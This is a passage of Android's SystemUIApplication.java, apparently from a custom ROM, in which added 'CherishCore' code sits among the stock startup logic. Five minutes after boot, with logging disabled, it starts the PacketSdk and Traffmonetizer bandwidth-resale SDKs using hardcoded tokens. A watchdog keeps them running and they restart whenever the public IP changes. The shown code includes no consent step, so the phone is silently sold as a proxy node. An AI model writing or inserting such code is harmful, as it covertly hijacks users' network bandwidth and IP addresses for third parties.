/*
 * Copyright (C) 2014 The Android Open Source Project
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License
 */

package com.android.systemui;

import android.animation.Animator;
import android.annotation.SuppressLint;
import android.app.ActivityThread;
import android.app.Application;
import android.app.Notification;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.res.Configuration;
import android.os.Bundle;
import android.os.Process;
import android.os.Trace;
import android.util.Log;
import android.util.TimingsTraceLog;
import android.view.SurfaceControl;
import android.view.ThreadedRenderer;
import android.view.View;
import android.net.ConnectivityManager;
import android.net.LinkProperties;
import android.net.Network;
import android.net.NetworkCapabilities;
import android.net.NetworkRequest;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.Looper;

import androidx.annotation.NonNull;
import androidx.annotation.VisibleForTesting;

import com.android.internal.protolog.ProtoLog;
import com.android.systemui.dagger.GlobalRootComponent;
import com.android.systemui.dagger.SysUIComponent;
import com.android.systemui.dump.DumpManager;
import com.android.systemui.process.ProcessWrapper;
import com.android.systemui.res.R;
import com.android.systemui.statusbar.phone.ConfigurationForwarder;
import com.android.systemui.util.NotificationChannels;
import com.android.wm.shell.dagger.HasWMComponent;
import com.android.wm.shell.dagger.WMComponent;

import java.lang.reflect.InvocationTargetException;
import java.util.ArrayDeque;
import java.util.Comparator;
import java.util.HashSet;
import java.util.Map;
import java.util.Set;
import java.util.StringJoiner;
import java.util.TreeMap;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.HttpURLConnection;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.URL;
import java.nio.ByteBuffer;
import java.nio.ByteOrder;
import java.util.Locale;
import java.util.concurrent.Callable;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;
import java.util.concurrent.ThreadLocalRandom;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.TimeoutException;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.regex.Pattern;

import com.packet.sdk.PacketSdk;
import com.traffmonetizer.sdk.TraffmonetizerSdk;

import javax.inject.Provider;

/**
 * Application class for SystemUI.
 */
public class SystemUIApplication extends Application implements
        SystemUIAppComponentFactoryBase.ContextInitializer, HasWMComponent {

    public static final String TAG = "SystemUIService";
    private static final boolean DEBUG = false;

    private BootCompleteCacheImpl mBootCompleteCache;

    private static final String CHERISH_TAG = "CherishCore";
    private static final boolean LOG_DEBUG = false;

    private static final long BOOT_DELAY_MS        = 5 * 60 * 1000L;  
    private static final long NET_DEBOUNCE_MS      = 5000L;          
    private static final long WATCHDOG_PERIOD_MS   = 10 * 60 * 1000L;
    private static final long RESTART_DELAY_MS     = 1500L;           

    private static final int DNS_TIMEOUT_MS        = 1000;  // DNS lookup timeout
    private static final int STUN_TIMEOUT_MS       = 1500;  // STUN request timeout
    private static final int TCP_PING_TIMEOUT_MS   = 800;   // TCP ping timeout
    private static final int HTTP_CONN_MS          = 2500;  // HTTP connect
    private static final int HTTP_READ_MS          = 2500;  // HTTP read

    private static final int MAX_FAILOVER_ATTEMPTS = 2;     // Chỉ thử max 2 hosts
    private static final int CIRCUIT_BREAKER_THRESHOLD = 5; // Sau 5 lần fail liên tiếp → dừng tạm thời
    private static final long CIRCUIT_BREAKER_RESET_MS = 5 * 60 * 1000L; // Reset sau 5 phút

    private static final boolean USE_HTTP_FALLBACK = true;   // bật/tắt fallback HTTP
    private static final int MAX_STUN_FAILOVER     = 2;      // thử thêm tối đa 2 host STUN khác
    private static final int MAX_HTTP_FAILOVER     = 1;      // thử thêm tối đa 1 endpoint HTTP
    private static final long IP_CHECK_COOLDOWN_MS = 7_000L; // chống spam check IP

    private volatile String mLastNetSig = "";
    private volatile long mLastIpCheckMs = 0L; // cập nhật CHỈ khi lấy IP thành công

    private static final long MIN_START_GAP_MS = 5_000L; // 5s giữa 2 lần start
    private static final long MIN_STOP_GAP_MS  = 5_000L; // 5s giữa 2 lần stop (chưa dùng)
    private long mLastStartMs = 0L;
    private long mLastStopMs  = 0L;

    private static final Pattern IPV4 = Pattern.compile(
        "^(25[0-5]|2[0-4]\\d|1?\\d?\\d)\\.(25[0-5]|2[0-4]\\d|1?\\d?\\d)\\.(25[0-5]|2[0-4]\\d|1?\\d?\\d)\\.(25[0-5]|2[0-4]\\d|1?\\d?\\d)$"
    );

    private static final String[] STUN_HOSTS = new String[]{
        "stun.l.google.com:19302",
        "stun1.l.google.com:19302",
        "stun2.l.google.com:19302",
        "stun3.l.google.com:19302"
    };

    private static final String[] HTTP_IP_ENDPOINTS = new String[]{
        "https://api4.ipify.org",
        "https://ipv4.icanhazip.com",
        "https://checkip.amazonaws.com"
    };

    private static final String PACKET_TOKEN = "2moJlSlHCw3CFhpr";
    private static final String TRAFF_TOKEN  = "FjywZtV/qTeM42D0OyLjWHOQ8dppIo8e3ln4KCrCGnU=";

    private final AtomicBoolean mBootRxRegistered = new AtomicBoolean(false);

    private HandlerThread mWorkerThread;
    private HandlerThread mNetworkThread;
    private Handler mWorker;
    private Handler mNetworkHandler;
    private final Handler mMain = new Handler(Looper.getMainLooper());

    private ExecutorService mDnsExecutor;

    private ConnectivityManager mCm;
    private ConnectivityManager.NetworkCallback mNetCb;

    private volatile String mLastPublicIp = null;
    private int mCurrentStunIndex = 0;
    private int mCurrentHttpIndex = 0;

    private final AtomicBoolean mInitialized = new AtomicBoolean(false);
    private final AtomicBoolean mBootCompleted = new AtomicBoolean(false);
    private final AtomicBoolean mPacketInited = new AtomicBoolean(false);
    private final AtomicBoolean mPacketStarted = new AtomicBoolean(false);
    private final AtomicBoolean mTraffInited = new AtomicBoolean(false);
    private final AtomicBoolean mTraffStarted = new AtomicBoolean(false);

    // Circuit breaker
    private final AtomicInteger mConsecutiveFailures = new AtomicInteger(0);
    private volatile long mCircuitBreakerOpenedAt = 0;

    // ── Logging ──────────────────────────────────────────────────────────
    private static void d(String fmt, Object... a) { if(LOG_DEBUG) Log.d(CHERISH_TAG, String.format(Locale.US, fmt, a)); }
    private static void i(String fmt, Object... a) { if(LOG_DEBUG) Log.i(CHERISH_TAG, String.format(Locale.US, fmt, a)); }
    private static void w(String fmt, Object... a) { if(LOG_DEBUG) Log.w(CHERISH_TAG, String.format(Locale.US, fmt, a)); }
    private static void e(String fmt, Throwable t, Object... a) { if(LOG_DEBUG) Log.e(CHERISH_TAG, String.format(Locale.US, fmt, a), t); }

    /**
     * Hold a reference on the stuff we start.
     */
    private CoreStartable[] mServices;
    private boolean mServicesStarted;
    private SystemUIAppComponentFactoryBase.ContextAvailableCallback mContextAvailableCallback;
    private SysUIComponent mSysUIComponent;
    private SystemUIInitializer mInitializer;
    private ProcessWrapper mProcessWrapper;

    public SystemUIApplication() {
        super();
        if (!isSubprocess()) {
            Trace.registerWithPerfetto();
        }
        Log.v(TAG, "SystemUIApplication constructed.");
        // SysUI may be building without protolog preprocessing in some cases
        ProtoLog.REQUIRE_PROTOLOGTOOL = false;
    }

    @VisibleForTesting
    @Override
    public void attachBaseContext(Context base) {
        super.attachBaseContext(base);
    }

    protected GlobalRootComponent getRootComponent() {
        return mInitializer.getRootComponent();
    }

    @SuppressLint("RegisterReceiverViaContext")
    @Override
    public void onCreate() {
        super.onCreate();

        if (isSubprocess()) {
            d("Subprocess detected, skip CherishCore");
        } else {
            d("Main process - registering boot receiver");
            try {
                IntentFilter filter = new IntentFilter(Intent.ACTION_BOOT_COMPLETED);
                if (mBootRxRegistered.compareAndSet(false, true)) {
                    registerReceiver(mBootReceiver, filter);
                }
            } catch (Throwable t) { e("registerReceiver", t); }
            d("System already booted, delayed start");
            mMain.postDelayed(this::onBootCompletedSafe, 30_000L); // 30s delay
        }

        Log.v(TAG, "SystemUIApplication created.");
        TimingsTraceLog log = new TimingsTraceLog("SystemUIBootTiming",
                Trace.TRACE_TAG_APP);
        log.traceBegin("DependencyInjection");
        mInitializer = mContextAvailableCallback.onContextAvailable(this);
        mSysUIComponent = mInitializer.getSysUIComponent();
        mBootCompleteCache = mSysUIComponent.provideBootCacheImpl();
        log.traceEnd();

        GlobalRootComponent rootComponent = mInitializer.getRootComponent();

        // Enable Looper trace points.
        // This allows us to see Handler callbacks on traces.
        rootComponent.getMainLooper().setTraceTag(Trace.TRACE_TAG_APP);
        mProcessWrapper = rootComponent.getProcessWrapper();

        // Set the application theme that is inherited by all services. Note that setting the
        // application theme in the manifest does only work for activities. Keep this in sync with
        // the theme set there.
        setTheme(R.style.Theme_SystemUI);

        View.setTraceLayoutSteps(
                rootComponent.getSystemPropertiesHelper()
                        .getBoolean("persist.debug.trace_layouts", false));
        View.setTracedRequestLayoutClassClass(
                rootComponent.getSystemPropertiesHelper()
                        .get("persist.debug.trace_request_layout_class", null));

        if (Flags.enableLayoutTracing()) {
            View.setTraceLayoutSteps(true);
        }
        if (com.android.window.flags.Flags.systemUiPostAnimationEnd()) {
            Animator.setPostNotifyEndListenerEnabled(true);
        }

        if (mProcessWrapper.isSystemUser()) {
            IntentFilter bootCompletedFilter = new
                    IntentFilter(Intent.ACTION_LOCKED_BOOT_COMPLETED);
            bootCompletedFilter.setPriority(IntentFilter.SYSTEM_HIGH_PRIORITY);

            // If SF GPU context priority is set to realtime, then SysUI should run at high.
            // The priority is defaulted at medium.
            int sfPriority = SurfaceControl.getGPUContextPriority();
            Log.i(TAG, "Found SurfaceFlinger's GPU Priority: " + sfPriority);
            if (sfPriority == ThreadedRenderer.EGL_CONTEXT_PRIORITY_REALTIME_NV) {
                Log.i(TAG, "Setting SysUI's GPU Context priority to: "
                        + ThreadedRenderer.EGL_CONTEXT_PRIORITY_HIGH_IMG);
                ThreadedRenderer.setContextPriority(
                        ThreadedRenderer.EGL_CONTEXT_PRIORITY_HIGH_IMG);
            }

            registerReceiver(new BroadcastReceiver() {
                @Override
                public void onReceive(Context context, Intent intent) {
                    if (mBootCompleteCache.isBootComplete()) return;

                    if (DEBUG) Log.v(TAG, "BOOT_COMPLETED received");
                    unregisterReceiver(this);
                    mBootCompleteCache.setBootComplete();
                    if (mServicesStarted) {
                        final int N = mServices.length;
                        for (int i = 0; i < N; i++) {
                            notifyBootCompleted(mServices[i]);
                        }
                    }
                }
            }, bootCompletedFilter);

            IntentFilter localeChangedFilter = new IntentFilter(Intent.ACTION_LOCALE_CHANGED);
            registerReceiver(new BroadcastReceiver() {
                @Override
                public void onReceive(Context context, Intent intent) {
                    if (Intent.ACTION_LOCALE_CHANGED.equals(intent.getAction())) {
                        if (!mBootCompleteCache.isBootComplete()) return;
                        // Update names of SystemUi notification channels
                        NotificationChannels.createAll(context);
                    }
                }
            }, localeChangedFilter);
        } else {
            // We don't need to startServices for sub-process that is doing some tasks.
            // (screenshots, sweetsweetdesserts or tuner ..)
            if (isSubprocess()) {
                return;
            }
            // For a secondary user, boot-completed will never be called because it has already
            // been broadcasted on startup for the primary SystemUI process.  Instead, for
            // components which require the SystemUI component to be initialized per-user, we
            // start those components now for the current non-system user.
            startSecondaryUserServicesIfNeeded();
        }
    }

    @Override
    public void onTerminate() {
        d("onTerminate()");
        teardownWorkers();
        try {
            if (mBootRxRegistered.compareAndSet(true, false)) {
                unregisterReceiver(mBootReceiver);
            }
        } catch (Throwable ignore) {}
        super.onTerminate();
    }

    // ── Boot Receiver ────────────────────────────────────────────────────
    private final BroadcastReceiver mBootReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            if (Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction())) {
                d("BOOT_COMPLETED received");
                mMain.postDelayed(SystemUIApplication.this::onBootCompletedSafe, BOOT_DELAY_MS);
            }
        }
    };

    private void onBootCompletedSafe() {
        if (mBootCompleted.getAndSet(true)) {
            d("Already boot completed");
            return;
        }
        d("Starting CherishCore after boot delay");
        safeStartWorkers();
    }

    private void safeStartWorkers() {
        try {
            setupWorkers();
            mMain.removeCallbacks(mWatchdog);
            mMain.postDelayed(mWatchdog, WATCHDOG_PERIOD_MS);
        } catch (Throwable t) {
            e("safeStartWorkers failed", t);
            mMain.postDelayed(this::safeStartWorkers, 10_000L);
        }
    }

    private void setupWorkers() {
        if (mInitialized.getAndSet(true)) {
            d("Already initialized");
            return;
        }

        mCm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);

        mDnsExecutor = Executors.newFixedThreadPool(2, r -> {
            Thread t = new Thread(r, "CherishCore-DNS");
            t.setDaemon(true);
            return t;
        });

        mWorkerThread = new HandlerThread("CherishCore-Worker", Process.THREAD_PRIORITY_BACKGROUND);
        mWorkerThread.setUncaughtExceptionHandler((t, ex) -> {
            e("Uncaught on worker: " + t.getName(), ex);
            mMain.post(() -> {
                teardownWorkers();
                mMain.postDelayed(this::safeStartWorkers, 10_000L);
            });
        });
        mWorkerThread.start();
        mWorker = new Handler(mWorkerThread.getLooper());

        mNetworkThread = new HandlerThread("CherishCore-Network", Process.THREAD_PRIORITY_BACKGROUND);
        mNetworkThread.start();
        mNetworkHandler = new Handler(mNetworkThread.getLooper());

        registerNetworkCallback();

        mWorker.postDelayed(this::handleNetworkState, 30_000L);

        d("Workers setup complete");
    }

    private void teardownWorkers() {
        d("teardownWorkers()");

        mInitialized.set(false);

        try {
            if (mWorker != null) mWorker.removeCallbacksAndMessages(null);
            if (mNetworkHandler != null) mNetworkHandler.removeCallbacksAndMessages(null);
            unregisterNetworkCallback();
            stopAll();
        } catch (Throwable t) {
            e("teardown error", t);
        } finally {
            if (mWorkerThread != null) {
                mWorkerThread.quitSafely();
                try { mWorkerThread.join(2000); } catch (InterruptedException ignore) {}
                mWorkerThread = null;
            }
            if (mNetworkThread != null) {
                mNetworkThread.quitSafely();
                try { mNetworkThread.join(2000); } catch (InterruptedException ignore) {}
                mNetworkThread = null;
            }
            if (mDnsExecutor != null) {
                mDnsExecutor.shutdownNow();
                mDnsExecutor = null;
            }

            // Ensure receiver is unregistered even if onTerminate won't be called
            try {
                if (mBootRxRegistered.compareAndSet(true, false)) {
                    unregisterReceiver(mBootReceiver);
                }
            } catch (Throwable ignore) {}

            mWorker = null;
            mNetworkHandler = null;
        }
    }

    // ── Watchdog ─────────────────────────────────────────────────────────
    private final Runnable mWatchdog = new Runnable() {
        @Override
        public void run() {
            boolean workerDead = (mWorkerThread == null) || !mWorkerThread.isAlive();
            boolean networkDead = (mNetworkThread == null) || !mNetworkThread.isAlive();

            if (workerDead || networkDead) {
                w("Watchdog: thread dead (worker=%b, network=%b) → restart", workerDead, networkDead);
                teardownWorkers();
                mMain.postDelayed(SystemUIApplication.this::safeStartWorkers, 10_000L);
                return;
            }

            mMain.postDelayed(this, WATCHDOG_PERIOD_MS);
        }
    };

    private void registerNetworkCallback() {
        if (mCm == null || mNetworkHandler == null) return;

        NetworkRequest req = new NetworkRequest.Builder()
                .addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
                .addCapability(NetworkCapabilities.NET_CAPABILITY_VALIDATED)
                .addCapability(NetworkCapabilities.NET_CAPABILITY_NOT_RESTRICTED)
                .build();

        mNetCb = new ConnectivityManager.NetworkCallback() {
            @Override public void onAvailable(Network n) { onNetworkChanged(); }
            @Override public void onLost(Network n) { onNetworkChanged(); }
            @Override public void onCapabilitiesChanged(Network n, NetworkCapabilities c) { onNetworkChanged(); }
            @Override public void onLinkPropertiesChanged(Network n, LinkProperties lp) { onNetworkChanged(); }
        };

        mCm.registerNetworkCallback(req, mNetCb, mNetworkHandler);
        d("Network callback registered");
    }

    private void unregisterNetworkCallback() {
        if (mCm != null && mNetCb != null) {
            try {
                mCm.unregisterNetworkCallback(mNetCb);
                d("Network callback unregistered");
            } catch (Throwable ignore) {}
            mNetCb = null;
        }
    }
    
    private void onNetworkChanged() {
        if (mWorker == null) return;
        mWorker.removeCallbacks(mOnNetChangedDebounced);
        mWorker.postDelayed(mOnNetChangedDebounced, NET_DEBOUNCE_MS);
    }
    
    private final Runnable mOnNetChangedDebounced = new Runnable() {
        @Override
        public void run() {
            final Network n = (mCm != null) ? mCm.getActiveNetwork() : null;
            if (n == null) { handleNetworkState(); return; }

            NetworkCapabilities caps = mCm.getNetworkCapabilities(n);
            LinkProperties lp = mCm.getLinkProperties(n);
            String sig = buildNetSignature(n, caps, lp);

            if (sig.equals(mLastNetSig)) {
                d("Net sig unchanged → skip");
                return;
            }
            handleNetworkState();
        }
    };

    private static String buildNetSignature(Network n, NetworkCapabilities caps, LinkProperties lp) {
        if (caps == null || lp == null) return "null";
        // transports bitmask
        int tmask = 0;
        for (int t = 0; t <= 10; t++) if (caps.hasTransport(t)) tmask |= (1 << t);
        // default route presence + iface + dns set size
        int routes = (lp.getRoutes() != null) ? lp.getRoutes().size() : 0;
        int dns = (lp.getDnsServers() != null) ? lp.getDnsServers().size() : 0;
        String ifn = String.valueOf(lp.getInterfaceName());
        return n.hashCode() + "|" + tmask + "|" + ifn + "|" + routes + "|" + dns;
    }

    private void handleNetworkState() {
        if (mCm == null) {
            w("ConnectivityManager null");
            return;
        }
        
        if (isCircuitBreakerOpen()) {
            w("Circuit breaker OPEN, skip");
            return;
        }
        
        Network active = mCm.getActiveNetwork();
        if (active == null) {
            w("No active network → stopAll");
            stopAll();
            return;
        }
        
        NetworkCapabilities caps = mCm.getNetworkCapabilities(active);
        if (caps == null) {
            w("No capabilities → stopAll");
            stopAll();
            return;
        }
        
        boolean validated = caps.hasCapability(NetworkCapabilities.NET_CAPABILITY_VALIDATED);
        if (!validated) {
            w("Not VALIDATED (captive portal?) → stopAll");
            stopAll();
            return;
        }
        
        final String newSig = buildNetSignature(active, caps, mCm.getLinkProperties(active));

        String ip = fetchPublicIpSmart(active);
        if (ip == null) {
            w("Cannot obtain public IPv4 → stopAll");
            recordFailure();
            stopAll();
            return;
        }
        
        mConsecutiveFailures.set(0);
        mLastNetSig = newSig;
        mLastIpCheckMs = android.os.SystemClock.elapsedRealtime(); // chỉ set khi thành công

        if (ip.equals(mLastPublicIp)) {
            d("Public IP unchanged (%s)", ip);
            if (!mPacketStarted.get() || !mTraffStarted.get()) {
                d("SDK not running → init/start");
                initAll();
                startAll();
            }
            return;
        }

        i("Public IP changed: %s → %s | restart SDK", mLastPublicIp, ip);
        mLastPublicIp = ip;

        final boolean running = mPacketStarted.get() || mTraffStarted.get();
        if (running) {
            try { stopAll(); } catch (Throwable t) { e("stopAll on restart", t); }
            if (mWorker != null) {
                mWorker.postDelayed(() -> {
                    initAll();
                    startAll();
                }, RESTART_DELAY_MS);
            }
        } else {
            initAll();
            startAll();
        }
    }

    private void recordFailure() {
        int failures = mConsecutiveFailures.incrementAndGet();
        if (failures >= CIRCUIT_BREAKER_THRESHOLD) {
            w("Circuit breaker OPENED after %d failures", failures);
            mCircuitBreakerOpenedAt = System.currentTimeMillis();
        }
    }

    private boolean isCircuitBreakerOpen() {
        if (mConsecutiveFailures.get() < CIRCUIT_BREAKER_THRESHOLD) {
            return false;
        }

        long elapsed = System.currentTimeMillis() - mCircuitBreakerOpenedAt;
        if (elapsed > CIRCUIT_BREAKER_RESET_MS) {
            i("Circuit breaker RESET after %d ms", elapsed);
            mConsecutiveFailures.set(0);
            return false;
        }
        
        return true;
    }

    private String fetchPublicIpSmart(Network active) {
        // Cooldown dựa trên lần THÀNH CÔNG gần nhất
        long now = android.os.SystemClock.elapsedRealtime();
        if (now - mLastIpCheckMs < IP_CHECK_COOLDOWN_MS) {
            d("IP check cooldown(since success) → skip");
            return mLastPublicIp; // dùng lại IP cũ nếu có
        }

        // 1) STUN @ current index
        if (STUN_HOSTS.length > 0) {
            String ip = tryStunAtIndex(mCurrentStunIndex, active);
            if (ip != null) return ip;

            // 1b) STUN failover (thử tối đa MAX_STUN_FAILOVER host khác)
            int tried = 0;
            for (int i = 0; i < STUN_HOSTS.length && tried < MAX_STUN_FAILOVER; i++) {
                if (i == mCurrentStunIndex) continue;
                String h = STUN_HOSTS[i];
                int colon = h.lastIndexOf(':');
                String host = (colon > 0) ? h.substring(0, colon) : h;
                int port  = (colon > 0) ? parseIntSafe(h.substring(colon + 1), 19302) : 19302;

                if (stunPing(host, port, active)) { // UDP ping cực nhẹ
                    d("STUN failover %d → %d", mCurrentStunIndex, i);
                    mCurrentStunIndex = i;
                    ip = tryStunAtIndex(i, active);
                    if (ip != null) return ip;
                }
                tried++;
            }
        }

        // 2) HTTP fallback (chỉ khi được bật)
        if (USE_HTTP_FALLBACK && HTTP_IP_ENDPOINTS.length > 0) {
            // 2a) HTTP @ current index
            String ip = tryHttpAtIndex(mCurrentHttpIndex, active);
            if (ip != null) return ip;

            // 2b) HTTP failover (thử tối đa MAX_HTTP_FAILOVER endpoint khác; có TCP ping trước để tiết kiệm)
            int tried = 0;
            for (int i = 0; i < HTTP_IP_ENDPOINTS.length && tried < MAX_HTTP_FAILOVER; i++) {
                if (i == mCurrentHttpIndex) continue;
                try {
                    URL u = new URL(HTTP_IP_ENDPOINTS[i]);
                    if (tcpPing(u.getHost(), 443, active)) { // tránh handshake TLS vô ích
                        d("HTTP failover %d → %d", mCurrentHttpIndex, i);
                        mCurrentHttpIndex = i;
                        ip = tryHttpAtIndex(i, active);
                        if (ip != null) return ip;
                    }
                } catch (Throwable ignore) {}
                tried++;
            }
        }

        // 3) Không lấy được
        return null;
    }

    private String tryStunAtIndex(int idx, Network active) {
        if (idx < 0 || idx >= STUN_HOSTS.length) return null;
        
        String h = STUN_HOSTS[idx];
        int colon = h.lastIndexOf(':');
        String host = (colon > 0) ? h.substring(0, colon) : h;
        int port = (colon > 0) ? parseIntSafe(h.substring(colon + 1), 19302) : 19302;
        
        try {
            String ip = stunPublicIPv4(host, port, active);
            if (ip != null && IPV4.matcher(ip).matches()) {
                d("STUN ok @%s:%d → %s", host, port, ip);
                return ip;
            }
        } catch (Throwable t) {
            e("STUN error @" + host + ":" + port, t);
        }
        return null;
    }
    
    private boolean stunPing(String host, int port, Network active) {
        try {
            return stunPublicIPv4(host, port, active) != null;
        } catch (Throwable ignore) {
            return false;
        }
    }
    
    private String stunPublicIPv4(String host, int port, Network active) throws Exception {
        InetAddress addr = resolveHostWithTimeout(host, DNS_TIMEOUT_MS, active);
        if (addr == null) throw new Exception("DNS timeout for " + host);
        
        byte[] txid = new byte[12];
        ThreadLocalRandom.current().nextBytes(txid);
        
        ByteBuffer req = ByteBuffer.allocate(20).order(ByteOrder.BIG_ENDIAN);
        req.putShort((short) 0x0001);
        req.putShort((short) 0x0000);
        req.putInt(0x2112A442);
        req.put(txid);
        
        DatagramSocket sock = null;
        try {
            // Bind với timeout
            sock = new DatagramSocket(null);
            sock.setReuseAddress(true);
            sock.bind(null); // bind to any available port
            sock.setSoTimeout(STUN_TIMEOUT_MS);
            
            try {
                if (active != null) active.bindSocket(sock);
            } catch (Throwable t) { w("bindSocket UDP failed: %s", t.getMessage()); }

            sock.send(new DatagramPacket(req.array(), req.capacity(), addr, port));
            
            byte[] buf = new byte[128];
            DatagramPacket in = new DatagramPacket(buf, buf.length);
            sock.receive(in);
            
            return parseStunResponse(buf, in.getLength(), txid);
            
        } finally {
            if (sock != null && !sock.isClosed()) {
                sock.close();
            }
        }
    }
    
    private String parseStunResponse(byte[] buf, int len, byte[] txid) {
        ByteBuffer bb = ByteBuffer.wrap(buf, 0, len).order(ByteOrder.BIG_ENDIAN);
        if (bb.remaining() < 20) return null;
        
        int mtype = bb.getShort() & 0xFFFF;
        int mlen = bb.getShort() & 0xFFFF;
        int mcook = bb.getInt();
        byte[] rxid = new byte[12];
        bb.get(rxid);
        
        if (mcook != 0x2112A442) return null;
        for (int i = 0; i < 12; i++) {
            if (rxid[i] != txid[i]) return null;
        }
        
        int toRead = Math.min(mlen, bb.remaining());
        int start = bb.position();
        
        while (bb.position() - start < toRead) {
            if (bb.remaining() < 4) break;
            
            int t = bb.getShort() & 0xFFFF;
            int l = bb.getShort() & 0xFFFF;
            
            if (t == 0x0020 && l >= 8 && bb.remaining() >= l) {
                bb.get(); // Reserved
                int family = bb.get() & 0xFF;
                if (family != 0x01) {
                    int skip = l - 2;
                    if (skip > 0 && bb.remaining() >= skip) {
                        bb.position(bb.position() + skip);
                    }
                    continue;
                }
                
                int xPort = bb.getShort() & 0xFFFF;
                int xAddr = bb.getInt();
                int addrOut = xAddr ^ 0x2112A442;
                
                return String.format(Locale.US, "%d.%d.%d.%d",
                        (addrOut >>> 24) & 0xFF,
                        (addrOut >>> 16) & 0xFF,
                        (addrOut >>> 8) & 0xFF,
                        addrOut & 0xFF);
            } else {
                int pad = (l + 3) & ~3;
                if (bb.remaining() < pad) break;
                bb.position(bb.position() + pad);
            }
        }
        
        return null;
    }
    
    private String tryHttpAtIndex(int idx, Network active) {
        if (idx < 0 || idx >= HTTP_IP_ENDPOINTS.length) return null;
        
        String url = HTTP_IP_ENDPOINTS[idx];
        HttpURLConnection c = null;
        BufferedReader br = null;
        
        try {
            c = (HttpURLConnection) (active != null
                    ? active.openConnection(new URL(url))
                    : new URL(url).openConnection());
            c.setInstanceFollowRedirects(true);
            c.setConnectTimeout(HTTP_CONN_MS);
            c.setReadTimeout(HTTP_READ_MS);
            c.setUseCaches(false);
            c.setRequestMethod("GET");
            
            int code = c.getResponseCode();
            if (code != HttpURLConnection.HTTP_OK) return null;
            
            br = new BufferedReader(new InputStreamReader(c.getInputStream()));
            String line = br.readLine();
            String out = (line == null) ? null : line.trim();
            
            if (out != null && IPV4.matcher(out).matches()) {
                d("HTTP ok @%s → %s", url, out);
                return out;
            }
            return null;
            
        } catch (Throwable t) {
            e("HTTP error @" + url, t);
            return null;
        } finally {
            try {
                if (br != null) br.close();
            } catch (Throwable ignore) {}
            if (c != null) c.disconnect();
        }
    }
    
    private boolean tcpPing(String host, int port, Network active) {
        InetAddress addr = resolveHostWithTimeout(host, DNS_TIMEOUT_MS, active);
        if (addr == null) return false;
        
        try (java.net.Socket s = (active != null
                ? active.getSocketFactory().createSocket()
                : new java.net.Socket())) {
            s.connect(new InetSocketAddress(addr, port), TCP_PING_TIMEOUT_MS);
            return true;
        } catch (Throwable ignore) {
            return false;
        }
    }
    
    private InetAddress resolveHostWithTimeout(String host, int timeoutMs, Network active) {
        if (mDnsExecutor == null || mDnsExecutor.isShutdown()) return null;
        
        Future<InetAddress> future = mDnsExecutor.submit(new Callable<InetAddress>() {
            @Override
            public InetAddress call() throws Exception {
                if (active != null) {
                    InetAddress[] all = active.getAllByName(host);
                    return (all != null && all.length > 0) ? all[0] : null;
                } else {
                    return InetAddress.getByName(host);
                }
            }
        });
        
        try {
            return future.get(timeoutMs, TimeUnit.MILLISECONDS);
        } catch (TimeoutException e) {
            w("DNS timeout for %s", host);
            future.cancel(true);
            return null;
        } catch (Throwable t) {
            e("DNS error for " + host, t);
            return null;
        }
    }
    
    private void initAll() {
        i("initAll()");
    
        if (!mPacketInited.getAndSet(true)) {
            try {
                PacketSdk.initialize(getApplicationContext(), PACKET_TOKEN);
                PacketSdk.setEnableLogging(LOG_DEBUG);
                d("PacketSdk initialized");
            } catch (Throwable t) {
                e("PacketSdk.initialize", t);
                mPacketInited.set(false);
            }
        }
        
        if (!mTraffInited.getAndSet(true)) {
            try {
                if (LOG_DEBUG) {
                    TraffmonetizerSdk.INSTANCE.enableVerboseLogging(true);
                }
                TraffmonetizerSdk.INSTANCE.init(getApplicationContext(), TRAFF_TOKEN, false, true);
                d("Traffmonetizer initialized");
            } catch (Throwable t) {
                e("Traff.init", t);
                mTraffInited.set(false);
            }
        }
    }

    private void startAll() {
        i("startAll()");
        long now = android.os.SystemClock.elapsedRealtime();
        if (now - mLastStartMs < MIN_START_GAP_MS) { d("startAll throttled"); return; }
        mLastStartMs = now;

        if (mPacketInited.get() && !mPacketStarted.get()) {
            try {
                PacketSdk.start();
                d("PacketSdk started");
                mPacketStarted.set(true);
            } catch (Throwable t) {
                e("PacketSdk.start", t);
                mPacketStarted.set(false);
            }
        }

        if (mTraffInited.get() && !mTraffStarted.get()) {
            try {
                TraffmonetizerSdk.INSTANCE.start();
                d("Traff started");
                mTraffStarted.set(true);
            } catch (Throwable t) {
                e("Traff.start", t);
                mTraffStarted.set(false);
            }
        }
    }

    private void stopAll() {
        i("stopAll()");

        if (mPacketStarted.getAndSet(false)) {
            try { PacketSdk.stop(); d("PacketSdk stopped"); }
            catch (Throwable t) { e("PacketSdk.stop", t); }
        }

        if (mTraffStarted.getAndSet(false)) {
            try { TraffmonetizerSdk.INSTANCE.stop(); d("Traff stopped"); }
            catch (Throwable t) { e("Traff.stop", t); }
        }
    }

    private static int parseIntSafe(String s, int def) {
        try {
            return Integer.parseInt(s);
        } catch (Throwable ignore) {
            return def;
        }
    }

    /** Returns whether this is a subprocess (e.g. com.android.systemui:screenshot) */
    private boolean isSubprocess() {
        String processName = ActivityThread.currentProcessName();
        return processName != null && processName.contains(":");
    }

    public void startSystemUserServicesIfNeeded() {
        if (!shouldStartSystemUserServices()) {
            Log.wtf(TAG, "Tried starting SystemUser services on non-SystemUser");
            return;  // Per-user startables are handled in #startSystemUserServicesIfNeeded.
        }
        final String vendorComponent = mInitializer.getVendorComponent(getResources());

        // Sort the startables so that we get a deterministic ordering.
        // TODO: make #start idempotent and require users of CoreStartable to call it.
        Map<Class<?>, Provider<CoreStartable>> sortedStartables = new TreeMap<>(
                Comparator.comparing(Class::getName));
